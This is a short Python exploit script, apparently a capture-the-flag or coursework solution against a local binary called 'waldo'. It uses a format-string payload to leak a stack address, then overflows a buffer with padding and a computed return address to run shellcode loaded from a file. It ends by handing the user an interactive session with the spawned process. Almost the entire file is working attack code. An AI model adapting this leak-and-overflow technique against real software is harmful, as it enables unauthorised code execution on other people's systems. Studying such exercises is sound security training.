#!/usr/bin/env python3

# Small library of functions you might find useful
def interact(p):
    try:
        while True:
            readable, writable, exceptional = select.select([sys.stdin.buffer, p.stdout], [], [])

            # stdin -> process
            if sys.stdin.buffer in readable:
                buf = sys.stdin.buffer.read1()
                if not buf:
                    break
                p.stdin.write(buf)
                p.stdin.flush()

            # process -> stdout
            if p.stdout in readable:
                buf = p.stdout.read(4096)
                if not buf:
                    break
                sys.stdout.buffer.write(buf)
                sys.stdout.flush()
    except (EOFError, KeyboardInterrupt) as e:
        pass

# End of lib #####################################


def exploit(p):
    p.stdout.readline() # "what your name?"
    p.stdin.write(b"%11$llx\n")

    tmp = p.stdout.readline().strip() # "nice to meet you <return addr>"
    waldo_addr   = tmp.split(b" ")[-1]
    waldo_addr_b = (int(waldo_addr, 16) - 129).to_bytes(8, "little")

    intro = b"i" * 24 # nice.

    exploit = intro + waldo_addr_b + b"\n"

    p.stdin.write(exploit)

if __name__ == "__main__":
    import argparse, subprocess, select, sys
    parser = argparse.ArgumentParser(prog = "doit_waldo")
    parser.add_argument("-d", "--debug", action = "store_true")
    args = parser.parse_args()

    with open("./shellcode", "rb") as shellcode_f:
        shellcode = shellcode_f.read()

    p = subprocess.Popen(["./waldo", shellcode],
                         stdin = subprocess.PIPE,
                         stdout = subprocess.PIPE,
                         bufsize = 0,
                        )
    if args.debug:
        input(f"pid: {p.pid} (waiting for gdb attachment; Enter to continue)")
    exploit(p)
    interact(p)
